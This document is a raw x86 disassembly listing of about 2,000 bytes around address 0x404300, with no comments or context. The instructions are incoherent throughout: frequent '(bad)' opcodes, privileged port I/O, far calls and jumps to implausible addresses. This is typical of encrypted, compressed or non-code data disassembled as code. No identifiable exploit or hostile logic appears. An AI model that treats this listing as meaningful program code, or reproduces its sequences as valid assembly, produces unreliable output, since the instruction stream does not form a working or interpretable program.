  40426b:	push   esp
  40426c:	stc    
  40426d:	retf   0x2499
  404270:	stc    
  404271:	out    0xc5,eax
  404273:	dec    esp
  404274:	add    al,0xd3
  404276:	addr16 jae 0x404279
  404279:	fstp   TBYTE PTR [ebp-0x73]
  40427c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40427d:	or     ah,dh
  40427f:	data16 fucom st(0)
  404282:	bound  edi,QWORD PTR [edx+0x52]
  404285:	(bad)
  40428b:	cli    
  40428c:	cli    
  40428d:	mov    bh,0x99
  40428f:	pcmpgtb mm5,QWORD PTR [ebx]
  404292:	data16 add dh,bl
  404295:	enter  0xdba9,0xcb
  404299:	jmp    0x4042a8
  40429b:	jecxz  0x4042fb
  40429d:	loop   0x404307
  40429f:	test   dh,ch
  4042a1:	xor    eax,0x1453f287
  4042a6:	(bad)  
  4042a7:	xor    al,0x85
  4042a9:	xor    dh,BYTE PTR [eax-0x7b92972c]
  4042af:	push   edx
  4042b0:	push   0xcc1abbad
  4042b5:	mov    cl,0x65
  4042b7:	arpl   WORD PTR [ebp+0x37d8ed01],bp
  4042bd:	pop    esp
  4042be:	or     edi,edi
  4042c0:	dec    edi
  4042c1:	rcl    ah,cl
  4042c3:	sbb    eax,0x352027de
  4042c8:	jne    0x4042af
  4042ca:	jle    0x40425f
  4042cc:	aad    0x59
  4042ce:	outs   dx,DWORD PTR ds:[esi]
  4042cf:	sbb    bh,BYTE PTR [esp+esi*8-0x4f]
  4042d3:	loop   0x404272
  4042d5:	mov    bl,0xa8
  4042d7:	pop    edi
  4042d8:	ins    BYTE PTR es:[edi],dx
  4042d9:	mov    dl,0x68
  4042db:	pop    esp
  4042dc:	ror    DWORD PTR [esi],1
  4042de:	loope  0x40432c
  4042e0:	inc    ebp
  4042e1:	add    esp,eax
  4042e3:	jnp    0x40429b
  4042e5:	adc    edx,ebp
  4042e7:	ficomp WORD PTR [ecx+0x8144b2b]
  4042ed:	mov    eax,ds:0x71ab76c
  4042f2:	aas    
  4042f3:	es test bh,al
  4042f6:	aam    0x6e
  4042f8:	les    eax,FWORD PTR [esi]
  4042fa:	retf   0x525e
  4042fd:	int    0x8d
  4042ff:	and    BYTE PTR [esi+ebx*2-0x30],0xea
  404304:	cmp    eax,0xfbbc8eca
  404309:	add    eax,0x191b181c
  40430e:	jbe    0x4042a8
  404310:	mov    dh,0x5
  404312:	inc    esi
  404313:	mov    eax,ds:0x2dedb03f
  404318:	inc    ebx
  404319:	mov    edx,0xa503433
  40431e:	out    dx,eax
  40431f:	nop
  404320:	dec    eax
  404321:	jg     0x4042c8
  404323:	mov    DWORD PTR [ebx+0x6f627bbd],edx
  404329:	test   al,0xda
  40432b:	iret   
  40432c:	jo     0x4043a2
  40432e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40432f:	out    0xbf,eax
  404331:	stos   DWORD PTR es:[edi],eax
  404332:	or     edx,esp
  404334:	mov    ds:0xa1355179,al
  404339:	arpl   bp,cx
  40433b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40433c:	or     edx,edx
  40433e:	retf   0x431b
  404341:	xlat   BYTE PTR ds:[ebx]
  404342:	scas   al,BYTE PTR es:[edi]
  404343:	mov    cl,0xbf
  404345:	into   
  404346:	add    al,0x3b
  404348:	xor    bl,BYTE PTR [edi-0x4c7c44a2]
  40434e:	into   
  40434f:	xor    al,0x5a
  404351:	cs cmp al,0x79
  404354:	in     eax,0x50
  404356:	retf   
  404357:	cmp    ecx,DWORD PTR [edi+0x5f4c4ebe]
  40435d:	(bad)  
  40435f:	and    BYTE PTR [esi-0x49c1bb50],0x9a
  404366:	ret    0xe385
  404369:	inc    edx
  40436a:	cmp    al,0x5e
  40436c:	push   eax
  40436d:	ret    
  40436e:	lods   eax,DWORD PTR ds:[esi]
  40436f:	xchg   ebp,edi
  404371:	loopne 0x4043c9
  404373:	(bad)  
  404374:	mov    ecx,0x4c24e3fa
  404379:	dec    edi
  40437a:	sbb    al,0xc8
  40437c:	push   esp
  40437d:	(bad)  [edx]
  40437f:	jne    0x4043f2
  404381:	std    
  404382:	cmp    edx,eax
  404384:	add    BYTE PTR [ecx+0x32],cl
  404387:	adc    dh,BYTE PTR [edi-0x80]
  40438a:	inc    esi
  40438b:	and    eax,0x1182b2f6
  404390:	add    DWORD PTR [edx-0x24],esi
  404393:	call   0x83a5f30d
  404398:	xor    bl,BYTE PTR ds:[esi]
  40439b:	dec    ebx
  40439c:	dec    ebx
  40439d:	mov    eax,ds:0x360a50b0
  4043a2:	cdq    
  4043a3:	push   eax
  4043a4:	sub    ah,ch
  4043a6:	(bad)  
  4043a7:	sbb    eax,DWORD PTR [ebp-0x3]
  4043aa:	call   0x8c27e1c5
  4043af:	mov    DWORD PTR [ebp+0x32],esi
  4043b2:	jecxz  0x40441d
  4043b4:	xor    esi,DWORD PTR [ebp+esi*4+0x3c]
  4043b8:	loope  0x40434a
  4043ba:	in     al,dx
  4043bb:	sbb    al,0xc1
  4043bd:	imul   edi,esp,0x2fa1c02
  4043c3:	and    ah,dl
  4043c5:	add    bl,BYTE PTR [ecx-0x9]
  4043c8:	ss sti 
  4043ca:	int    0x35
  4043cc:	dec    esp
  4043cd:	aas    
  4043ce:	daa    
  4043cf:	adc    DWORD PTR [ebp+esi*1+0x28],ebp
  4043d3:	stc    
  4043d4:	lods   al,BYTE PTR ds:[esi]
  4043d5:	xlat   BYTE PTR ds:[ebx]
  4043d6:	add    eax,0x81f1b09a
  4043db:	pop    ds
  4043dc:	sbb    edi,DWORD PTR [esp+ebp*4]
  4043df:	inc    ebx
  4043e0:	and    DWORD PTR [esi-0x7071cb8c],esi
  4043e6:	std    
  4043e7:	arpl   bx,bp
  4043e9:	nop
  4043ea:	es retf 
  4043ec:	xchg   edx,eax
  4043ed:	pop    edx
  4043ee:	dec    esp
  4043ef:	std    
  4043f0:	push   ss
  4043f1:	mov    ebx,0x2f0d2bfc
  4043f6:	ret    
  4043f7:	sub    DWORD PTR [eax+0x6dd60ad2],edi
  4043fd:	xchg   ecx,eax
  4043fe:	cld    
  4043ff:	jg     0x40446f
  404401:	and    esp,ebp
  404403:	and    eax,esp
  404405:	mov    dh,0x3f
  404407:	js     0x40445a
  404409:	dec    ecx
  40440a:	scas   eax,DWORD PTR es:[edi]
  40440b:	rcl    BYTE PTR [edx-0x70703e9],1
  404411:	sub    BYTE PTR [ebx+ecx*2],ch
  404414:	call   0x2ec6ec3c
  404419:	mov    al,ds:0xba7bcd77
  40441e:	rcr    BYTE PTR [ebx-0x39],1
  404421:	cmp    edi,ecx
  404423:	in     eax,dx
  404424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404425:	pop    ecx
  404426:	mov    dh,0xb1
  404428:	mov    ecx,ecx
  40442a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40442b:	rcl    BYTE PTR [ebp-0x70],0x45
  40442f:	fwait
  404430:	cmp    ebp,DWORD PTR [ecx]
  404432:	in     eax,dx
  404433:	sub    BYTE PTR [ebx],bl
  404435:	jno    0x404428
  404437:	jnp    0x4044ae
  404439:	clc    
  40443a:	mov    ah,0xe6
  40443c:	ja     0x404488
  40443e:	stos   BYTE PTR es:[edi],al
  40443f:	mov    al,ds:0xf21efe83
  404444:	mov    ah,0x24
  404446:	dec    esi
  404447:	jmp    0x4043de
  404449:	ret    0x6966
  40444c:	jne    0x40444c
  40444e:	cld    
  40444f:	jle    0x4044a7
  404451:	push   0x12df289d
  404456:	cs loope 0x4044bb
  404459:	div    DWORD PTR [edx-0x77]
  40445c:	stos   DWORD PTR es:[edi],eax
  40445d:	enter  0xd,0x77
  404461:	mov    WORD PTR [edi+0x1c459ed2],ds
  404467:	adc    bl,0xe0
  40446a:	shr    BYTE PTR [ebx+0x59],1
  40446d:	sbb    DWORD PTR [edi+0x25aed463],0x1224bd57
  404477:	pop    ss
  404478:	retf   0xa666
  40447b:	iret   
  40447c:	add    BYTE PTR [esi],0xdb
  40447f:	pop    esp
  404480:	loop   0x4044d1
  404482:	push   0x92c2744c
  404487:	and    BYTE PTR [edi-0x1],0xb
  40448b:	stos   BYTE PTR es:[edi],al
  40448c:	fs jno 0x4044ed
  40448f:	call   0x40fd:0x631354fc
  404496:	mov    esp,0x82bf50a0
  40449b:	clc    
  40449c:	aas    
  40449d:	jbe    0x404509
  40449f:	loopne 0x40446e
  4044a1:	cmp    ebp,edi
  4044a3:	mov    bl,0x4c
  4044a5:	cmp    esp,eax
  4044a7:	mov    dh,0xaa
  4044a9:	jb     0x40450b
  4044ab:	inc    edx
  4044ac:	cmp    al,0xc9
  4044ae:	mov    ebp,0xab3f7d09
  4044b3:	push   ds
  4044b4:	jnp    0x4044d6
  4044b6:	in     al,dx
  4044b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b8:	fucom  st(4)
  4044ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044bb:	add    cl,cl
  4044bd:	pop    ebx
  4044be:	add    dh,BYTE PTR [edi-0x1a]
  4044c1:	xor    DWORD PTR [ebx],0x32cf8a85
  4044c7:	sbb    DWORD PTR [ebp-0x54],esp
  4044ca:	iret   
  4044cb:	mov    dl,BYTE PTR [edi+0x2f92c512]
  4044d1:	(bad)  
  4044d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d3:	dec    ecx
  4044d4:	push   esi
  4044d5:	dec    ebx
  4044d6:	arpl   si,sp
  4044d8:	jle    0x4044b1
  4044da:	xchg   edi,eax
  4044db:	mov    cl,0x9c
  4044dd:	mov    bl,0x34
  4044df:	mov    esi,0x10e4a84f
  4044e4:	ficom  WORD PTR [edi+eiz*1+0x2]
  4044e8:	adc    ch,bh
  4044ea:	or     edi,DWORD PTR [eax-0x70d24640]
  4044f0:	or     DWORD PTR [edx+0x23b5eb2],0x74acf221
  4044fa:	into   
  4044fb:	xor    BYTE PTR [edi-0x30ecbb1e],0x3a
  404502:	xor    DWORD PTR [ebx+0x37],edi
  404505:	nop
  404506:	cmp    eax,0xfc53d37b
  40450b:	add    eax,DWORD PTR [esi+eiz*2]
  40450e:	ss jae 0x40455f
  404511:	lds    esi,FWORD PTR [esi+0x72]
  404514:	sbb    eax,0xfcade949
  404519:	inc    esp
  40451a:	xchg   edi,eax
  40451b:	cld    
  40451c:	mov    bh,0xe8
  40451e:	jne    0x404587
  404520:	inc    ebx
  404521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404522:	inc    edi
  404523:	jne    0x40454b
  404525:	push   ecx
  404526:	sub    al,0x69
  404528:	ss icebp 
  40452a:	push   0x69865828
  40452f:	aad    0x1b
  404531:	or     BYTE PTR [edx],bl
  404533:	mov    al,0xca
  404535:	sub    ebx,DWORD PTR ds:0x87882423
  40453b:	shl    BYTE PTR ds:0x1fa77e8d,1
  404541:	sti    
  404542:	mov    bh,0x49
  404544:	shl    ebp,cl
  404546:	inc    ebp
  404547:	push   es
  404548:	(bad)  
  404549:	in     al,0x87
  40454b:	add    eax,0xf49cf6c
  404550:	ds sub ebx,ebx
  404553:	cld    
  404554:	push   ecx
  404555:	ins    BYTE PTR es:[edi],dx
  404556:	daa    
  404557:	outs   dx,DWORD PTR ds:[esi]
  404558:	scas   al,BYTE PTR es:[edi]
  404559:	sbb    al,0xb
  40455b:	scas   eax,DWORD PTR es:[edi]
  40455c:	mov    esi,0xfed2c536
  404561:	dec    esi
  404562:	jno    0x40450f
  404564:	jge    0x4045af
  404566:	adc    ebp,DWORD PTR [edx-0x20964636]
  40456c:	in     eax,dx
  40456d:	(bad)  
  40456e:	leave  
  40456f:	or     BYTE PTR [esi-0x2],dh
  404572:	cwde   
  404573:	xlat   BYTE PTR ds:[ebx]
  404574:	stos   DWORD PTR es:[edi],eax
  404575:	mov    edx,ebp
  404577:	js     0x404534
  404579:	stc    
  40457a:	loopne 0x404586
  40457c:	push   edx
  40457d:	push   eax
  40457e:	pop    ebp
  40457f:	pop    ss
  404580:	pop    esp
  404581:	sbb    eax,0xa46f32dc
  404586:	pop    ecx
  404587:	xor    eax,0x569158d4
  40458c:	xor    esi,DWORD PTR [ecx-0x6e]
  40458f:	xchg   DWORD PTR [esi-0x42],esp
  404592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404593:	popf   
  404594:	cmp    ecx,DWORD PTR [eax]
  404596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404597:	mov    bh,0xa5
  404599:	cli    
  40459a:	or     edi,0xffffffe1
  40459d:	jp     0x40456b
  40459f:	adc    al,0x91
  4045a1:	retf   
  4045a2:	fmul   DWORD PTR [ebx]
  4045a4:	aam    0x11
  4045a6:	mov    eax,0xdbd9acff
  4045ab:	pop    esp
  4045ac:	pop    ss
  4045ad:	(bad)  
  4045ae:	sub    al,0x20
  4045b0:	jae    0x404586
  4045b2:	mov    bl,0x27
  4045b4:	cs and eax,0x6a95853b
  4045ba:	(bad)  
  4045bb:	fpatan 
  4045bd:	dec    esi
  4045be:	aaa    
  4045bf:	(bad)  
  4045c1:	fcomp  QWORD PTR [ebx]
  4045c3:	inc    edi
  4045c4:	inc    edi
  4045c5:	leave  
  4045c6:	jp     0x4045c9
  4045c8:	in     eax,dx
  4045c9:	dec    eax
  4045ca:	cdq    
  4045cb:	push   0xfffffff3
  4045cd:	rol    BYTE PTR [ebp-0xa],1
  4045d0:	mov    al,0xb1
  4045d2:	cmp    bl,bl
  4045d4:	or     al,0xcd
  4045d6:	int    0x8c
  4045d8:	xchg   DWORD PTR [ecx-0x71],ebp
  4045db:	hlt    
  4045dc:	pop    ebp
  4045dd:	stc    
  4045de:	pop    edx
  4045df:	fidiv  WORD PTR [ebx-0x70]
  4045e2:	call   0xac76:0x68ccec02
  4045e9:	(bad)  
  4045ea:	sub    al,0x37
  4045ec:	repnz mov cl,0xe7
  4045ef:	pop    ebx
  4045f0:	sbb    al,0x66
  4045f2:	xchg   edi,eax
  4045f3:	dec    esp
  4045f4:	(bad)  
  4045f5:	sti    
  4045f6:	sbb    eax,0x34a21f11
  4045fb:	pop    eax
  4045fc:	aaa    
  4045fd:	mov    ds:0x619ec3f,al
  404602:	data16 jo 0x4045a8
  404605:	or     eax,0x987eba23
  40460a:	bnd jnp 0x40463c
  40460d:	cld    
  40460e:	(bad)  
  40460f:	fs inc ebp
  404611:	xchg   BYTE PTR [ebp+ebp*1-0x72],dl
  404615:	or     ah,BYTE PTR [ecx]
  404617:	mov    dh,0x37
  404619:	(bad)  [esp+edi*8]
  40461c:	push   edi
  40461d:	sub    DWORD PTR [esi],eax
  40461f:	pop    ds
  404620:	pop    es
  404621:	sub    BYTE PTR [ebp+0x2348ff96],ah
  404627:	rep outs dx,DWORD PTR ds:[esi]
  404629:	test   BYTE PTR ds:0xe08b48eb,bl
  40462f:	inc    edx
  404630:	dec    ecx
  404631:	fsub   QWORD PTR [ecx]
  404633:	dec    edi
  404634:	dec    esi
  404635:	fcomp  DWORD PTR [esi+0x63]
  404638:	(bad)  
  404639:	xchg   esi,eax
  40463a:	std    
  40463b:	jle    0x40467c
  40463d:	iret   
  40463e:	or     edx,DWORD PTR [esi]
  404640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404641:	out    dx,al
  404642:	mov    esi,0xc02d7484
  404647:	outs   dx,DWORD PTR ds:[esi]
  404648:	pop    ds
  404649:	mov    ebx,0x619d61b4
  40464e:	cmp    al,0x23
  404650:	dec    ecx
  404651:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  404653:	lahf   
  404654:	jo     0x404606
  404656:	mov    ebx,fs
  404658:	enter  0x242f,0x99
  40465c:	mov    dh,0x62
  40465e:	or     eax,0xef18ca1f
  404663:	test   DWORD PTR [edi],edi
  404665:	mov    ch,cl
  404667:	xor    BYTE PTR [edx-0x3e],ah
  40466a:	ja     0x40469c
  40466c:	lahf   
  40466d:	ror    DWORD PTR [edi],1
  40466f:	ja     0x40467c
  404671:	xchg   esi,eax
  404672:	ror    DWORD PTR [edi],0xb1
  404675:	sub    DWORD PTR [ecx+eax*1+0x5a],eax
  404679:	dec    ecx
  40467a:	in     eax,0x4b
  40467c:	cmp    DWORD PTR [edi-0x44],eax
  40467f:	(bad)  
  404680:	mov    dh,0xec
  404682:	and    bl,BYTE PTR [ebp+ecx*4+0x5607b587]
  404689:	mov    eax,ds:0x6042f23b
  40468e:	pop    ecx
  40468f:	mov    al,ds:0xadc52bef
  404694:	scas   al,BYTE PTR es:[edi]
  404695:	or     cl,BYTE PTR [ecx+0xb]
  404698:	jae    0x404700
  40469a:	jne    0x40469c
  40469c:	enter  0x3b0c,0x2
  4046a0:	mov    edi,0xcec86ec
  4046a5:	(bad)  
  4046a6:	jg     0x404628
  4046a8:	pop    es
  4046a9:	rol    DWORD PTR [edx],0xbc
  4046ac:	push   ebp
  4046ad:	mov    ebx,DWORD PTR [ebx+0x559fc787]
  4046b3:	add    ch,ah
  4046b5:	ins    BYTE PTR es:[edi],dx
  4046b6:	pushf  
  4046b7:	jge    0x4046e0
  4046b9:	lea    esp,[ebx]
  4046bb:	jp     0x40472f
  4046bd:	add    al,0xea
  4046bf:	push   ss
  4046c0:	std    
  4046c1:	mov    ebp,0x4fea01e7
  4046c6:	xor    BYTE PTR ds:0x4914a979,bh
  4046cc:	out    dx,eax
  4046cd:	add    edi,DWORD PTR [ecx]
  4046cf:	data16 daa 
  4046d1:	mov    edi,0x8cf58bea
  4046d6:	iret   
  4046d7:	push   eax
  4046d8:	scas   eax,DWORD PTR es:[edi]
  4046d9:	into   
  4046da:	pop    ds
  4046db:	mov    bl,0x17
  4046dd:	test   al,0x7f
  4046df:	inc    edx
  4046e0:	outs   dx,DWORD PTR ds:[esi]
  4046e1:	(bad)  
  4046e2:	(bad)  
  4046e3:	xchg   edi,eax
  4046e4:	clc    
  4046e5:	mov    cs,WORD PTR [ebx+0x74]
  4046e8:	aaa    
  4046e9:	ror    BYTE PTR ss:[eax+0x42a97445],cl
  4046f0:	scas   eax,DWORD PTR es:[edi]
  4046f1:	xchg   esp,eax
  4046f2:	fdiv   DWORD PTR [edi-0x640bfb37]
  4046f8:	push   esi
  4046f9:	dec    eax
  4046fa:	imul   edi,DWORD PTR [edi+0x7d],0x7
  4046fe:	mov    eax,0x250cd07b
  404703:	inc    edi
  404704:	inc    ebx
  404705:	fldpi  
  404707:	sbb    al,0xca
  404709:	dec    ecx
  40470a:	mov    al,ds:0xde4fce9a
  40470f:	cwde   
  404710:	outs   dx,DWORD PTR ds:[esi]
  404711:	repnz nop
  404713:	and    BYTE PTR [edx],cl
  404715:	inc    ecx
  404716:	xchg   ebx,eax
  404717:	push   ebx
  404718:	xchg   ecx,eax
  404719:	lahf   
  40471a:	pusha  
  40471b:	push   cs
  40471c:	dec    esi
  40471d:	pop    edi
  40471e:	inc    edx
  40471f:	cld    
  404720:	icebp  
  404721:	pop    edx
  404722:	test   eax,0x498351db
  404727:	inc    esp
  404728:	adc    DWORD PTR [ecx+0x63],ecx
  40472b:	xchg   ecx,eax
  40472c:	mov    dh,0x58
  40472e:	mov    DWORD PTR [edx+0x35823265],ecx
  404734:	mov    cl,0xc0
  404736:	adc    BYTE PTR [edx],ah
  404738:	jmp    0x40473e
  40473a:	fmul   QWORD PTR [ecx]
  40473c:	test   BYTE PTR [edi],ah
  40473e:	imul   ecx,DWORD PTR [edx],0x9a7ec083
  404744:	fnstsw WORD PTR [esi]
  404746:	aam    0x7a
  404748:	jle    0x4046e8
  40474a:	xchg   edx,eax
  40474b:	xor    edi,DWORD PTR [esi-0x4d77b043]
  404751:	arpl   WORD PTR [ecx],dx
  404753:	pop    edx
  404754:	xor    esi,ebx
  404756:	push   edx
  404757:	lahf   
  404758:	mov    bh,0xa3
  40475a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40475b:	in     al,dx
  40475c:	jl     0x40475e
  40475e:	push   cs
  40475f:	lds    eax,FWORD PTR [eax+0x10]
  404762:	ins    DWORD PTR es:[edi],dx
  404763:	or     ecx,DWORD PTR [eax-0x1e89b579]
  404769:	ss push edi
  40476b:	add    eax,0x853ec24a
  404770:	jmp    0xbc5d:0x9d91
  404776:	fisub  WORD PTR [edi*8+0x24a0e263]
  40477d:	cld    
  40477e:	lock enter 0xe748,0xf5
  404783:	jl     0x4047a0
  404785:	into   
  404786:	cs push edi
  404788:	jns    0x4047af
  40478a:	not    edx
  40478c:	es sbb eax,0xf9a797b2
  404792:	ins    BYTE PTR es:[edi],dx
  404793:	cmp    al,0xfa
  404795:	sub    edi,DWORD PTR [edi+0x11]
  404798:	push   eax
  404799:	jmp    0x4047b0
  40479b:	(bad)  
  40479c:	mov    WORD PTR [esi+0x13],cs
  40479f:	mov    ds:0x542541d3,eax
  4047a4:	and    ebp,DWORD PTR [esi]
  4047a6:	dec    ebx
  4047a7:	shl    BYTE PTR [edi+0x5fb1809e],cl
  4047ad:	rcr    BYTE PTR [eax+0x51],1
  4047b0:	push   esi
  4047b1:	sub    esi,ebx
  4047b3:	or     BYTE PTR [edi],cl
  4047b5:	sbb    eax,ebx
  4047b7:	loope  0x4047d5
  4047b9:	sbb    esp,esp
  4047bb:	ja     0x404813
  4047bd:	cld    
  4047be:	popa   
  4047bf:	push   eax
  4047c0:	imul   esi,DWORD PTR [ebp-0x6a],0x4f
  4047c4:	aad    0x40
  4047c6:	mov    dh,0x8b
  4047c8:	xor    BYTE PTR [edi+0x668fbbdc],al
  4047ce:	push   ecx
  4047cf:	cmp    ebx,DWORD PTR [ecx+edx*1]
  4047d2:	les    esi,FWORD PTR [ecx+edi*1-0x3ce7baf0]
  4047d9:	dec    ecx
  4047da:	mov    eax,0x8c08e752
  4047df:	mov    al,0xb9
  4047e1:	add    dl,BYTE PTR [bp+0x1a7]
  4047e6:	leave  
  4047e7:	jne    0x4047a4
  4047e9:	and    eax,0xe695a85c
  4047ee:	xchg   al,ah
  4047f0:	mov    al,ds:0xdbb65be8
  4047f5:	xchg   ebp,eax
  4047f6:	pop    ss
  4047f7:	shl    ch,cl
  4047f9:	inc    ebx
  4047fa:	cmp    eax,0xa5b8bfaa
  4047ff:	popf   
  404800:	mov    al,0xe8
  404802:	cld    
  404803:	xor    edi,DWORD PTR [edi+0x6b]
  404806:	pushf  
  404807:	outs   dx,DWORD PTR ds:[esi]
  404808:	(bad)  
  404809:	int    0xc0
  40480b:	or     BYTE PTR [ecx+0x4],dh
  40480e:	repz adc DWORD PTR [edx],ebx
  404811:	xchg   edi,eax
  404812:	jle    0x4047bd
  404814:	cmp    ecx,ecx
  404816:	jnp    0x4047e0
  404818:	les    esp,FWORD PTR gs:[esi-0x7fa13c44]
  40481f:	cvtps2pi mm1,QWORD PTR [edx-0x68e06d1]
  404826:	mov    esp,0xaeeecfe2
  40482b:	push   esp
  40482c:	push   ebx
  40482d:	out    dx,al
  40482e:	and    eax,0xae39c8b0
  404833:	or     al,BYTE PTR [ebp+0x25]
  404836:	adc    al,0x7
  404838:	inc    ebp
  404839:	fwait
  40483a:	stc    
  40483b:	pop    ecx
  40483c:	pop    es
  40483d:	add    esp,eax
  40483f:	ins    BYTE PTR es:[edi],dx
  404840:	add    DWORD PTR [esi+ebx*1-0x764c58c4],ecx
  404847:	mov    dl,0x43
  404849:	push   es
  40484a:	cdq    
  40484b:	jecxz  0x404886
  40484d:	dec    eax
  40484e:	mov    esi,0x1d52ec1a
  404854:	jmp    0x4047f4
  404856:	fdivr  QWORD PTR [esp+ebx*4-0x3b]
  40485a:	aam    0x32
  40485c:	sbb    DWORD PTR [edi+0x393de764],ebx
  404862:	retf   
  404863:	pop    es
  404864:	inc    ecx
  404865:	sahf   
  404866:	pop    esi
  404867:	mov    edx,0x9216915e
  40486c:	jg     0x4048be
  40486e:	in     al,dx
  40486f:	jle    0x4048c9
  404871:	mov    esp,0x5d03c9cf
  404876:	fs push esp
  404878:	xchg   ebp,eax
  404879:	shl    DWORD PTR [ebx],1
  40487b:	idiv   DWORD PTR [ebp-0xd56982d]
  404881:	fwait
  404882:	jmp    0xcda901a0
  404887:	or     dh,al
  404889:	inc    DWORD PTR [esi+0x57]
  40488c:	in     eax,dx
  40488d:	bound  esp,QWORD PTR [ebx+0x1d]
  404890:	cs add edi,edi
  404893:	mov    eax,ss
  404895:	xor    al,0xdf
  404897:	mov    dl,0x1a
  404899:	push   ecx
  40489a:	mov    cl,0x97
  40489c:	enter  0x2965,0xe7
  4048a0:	ret    0x2795
  4048a3:	fld    QWORD PTR [ecx]
  4048a5:	fcomp  st(0)
  4048a7:	pop    eax
  4048a8:	jg     0x404912
  4048aa:	push   ebx
  4048ab:	push   cs
  4048ac:	sbb    ecx,esp
  4048ae:	aad    0x36
  4048b0:	pop    edx
  4048b1:	xchg   ebx,eax
  4048b2:	call   0xcf9a:0x72d4b8f0
  4048b9:	or     BYTE PTR [ebx+0x5d4abe5d],al
  4048bf:	sbb    DWORD PTR ds:[edx-0x537d8fbf],ebx
  4048c6:	ins    BYTE PTR es:[edi],dx
  4048c7:	pop    ss
  4048c8:	dec    esi
  4048c9:	fstp   QWORD PTR [eax]
  4048cb:	fnstenv [esi]
  4048cd:	fisubr WORD PTR [ecx+eax*2]
  4048d0:	xor    eax,0x70fea8b2
  4048d5:	clc    
  4048d6:	jnp    0x40489e
  4048d8:	dec    ebx
  4048d9:	jmp    0x404907
  4048db:	mov    DWORD PTR [edi+0x4ddff48d],ecx
  4048e1:	mov    DWORD PTR [ebx+0x7a],ebp
  4048e4:	xor    eax,0xf45b24fc
  4048e9:	cli    
  4048ea:	or     esp,DWORD PTR [ecx-0x7afefc77]
  4048f0:	out    0x90,al
  4048f2:	pop    es
  4048f3:	mov    esi,0xd3114076
  4048f8:	imul   esi,DWORD PTR [ebx],0xffffffe5
  4048fb:	push   esp
  4048fc:	xor    DWORD PTR [eax-0x3848a997],ecx
  404902:	pop    ds
  404903:	cmp    ah,BYTE PTR [ebx-0x529a296]
  404909:	scas   al,BYTE PTR es:[edi]
  40490a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40490b:	and    eax,0x347947f3
  404910:	xor    bl,BYTE PTR [eax-0x31]
  404913:	loop   0x4048ad
  404915:	lds    ebx,FWORD PTR [ecx]
  404917:	repnz imul ebx,ebx,0xb9512467
  40491e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40491f:	xchg   ebx,eax
  404920:	xchg   ecx,eax
  404921:	xor    eax,0x8d28e9af
  404926:	or     BYTE PTR [edi+0x140624d9],ch
  40492c:	bound  edi,QWORD PTR [edi-0x79c6982f]
  404932:	xchg   DWORD PTR [esi+0x47bd297b],ebp
  404938:	lea    edi,[ebp-0x8943079]
  40493e:	jle    0x404996
  404940:	xchg   bl,ah
  404942:	adc    edi,ebp
  404944:	repnz dec ebx
  404946:	dec    esp
  404947:	(bad)  
  404948:	pop    esp
  404949:	jecxz  0x4049b7
  40494b:	mov    ch,0x14
  40494d:	fwait
  40494e:	mov    esi,0x2796e535
  404953:	push   edx
  404954:	jns    0x404962
  404956:	loopne 0x404985
  404958:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40495a:	fucomi st,st(0)
  40495c:	cli    
  40495d:	mov    dl,0xa2
  40495f:	mov    ch,0x30
  404961:	fdiv   DWORD PTR [esi]
  404963:	scas   al,BYTE PTR es:[edi]
  404964:	es test eax,0x72b1c864
  40496a:	rcr    DWORD PTR [edx-0xab0206c],0x36
  404971:	add    al,0xc6
  404973:	sbb    bl,BYTE PTR [edx+ebx*8-0x31332c78]
  40497a:	out    0x5b,eax
  40497c:	sub    DWORD PTR [ebx+0x62e26f44],esi
  404982:	and    dh,dh
  404984:	pop    eax
  404985:	mov    ds:0x9c000206,al
  40498a:	imul   ebp,ecx,0xa51fab3b
  404990:	in     al,0xf6
  404992:	add    dl,BYTE PTR [eax+edx*1]
  404995:	aam    0xc1
  404997:	add    eax,0x65f71049
  40499c:	push   edi
  40499d:	bound  eax,QWORD PTR [ebx]
  40499f:	stc    
  4049a0:	inc    edx
  4049a1:	lds    ebx,FWORD PTR [eax+0x16]
  4049a4:	jmp    0x40814575
  4049a9:	aas    
  4049aa:	mov    bh,bh
  4049ac:	sbb    esp,ebx
  4049ae:	xchg   ebx,eax
  4049af:	mov    edi,0xe2a0e633
  4049b4:	adc    cl,ah
  4049b6:	fist   DWORD PTR [eax-0x1c]
  4049b9:	loop   0x4049ac
  4049bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049bc:	or     al,0xdb
  4049be:	xchg   edi,eax
  4049bf:	pop    edx
  4049c0:	imul   esi,DWORD PTR ds:0xa01176e7,0x60c2732e
  4049ca:	dec    ecx
  4049cb:	in     al,dx
  4049cc:	test   al,0x41
  4049ce:	or     dh,al
  4049d0:	pop    eax
  4049d1:	sar    BYTE PTR [eax-0x45dcad38],cl
  4049d7:	ret    0xb2ae
  4049da:	and    DWORD PTR [esp+edx*2+0x4ca6e676],esp
  4049e1:	jbe    0x404a39
  4049e3:	retf   0x9ab7
  4049e6:	call   0x8db01b3d
  4049eb:	(bad)  
  4049ec:	pop    eax
  4049ed:	(bad)  [edx]
  4049ef:	fmul   st(0),st
  4049f1:	sar    BYTE PTR [edx],0x3
  4049f4:	aaa    
  4049f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f6:	ret    0xfc1e
  4049f9:	cmp    al,0xe2
  4049fb:	jmp    0x7b029d7a
  404a00:	ja     0x404a0d
  404a02:	dec    edi
  404a03:	out    dx,eax
  404a04:	and    al,0xa1
  404a06:	ret    0xd5c6
  404a09:	lods   al,BYTE PTR ds:[esi]
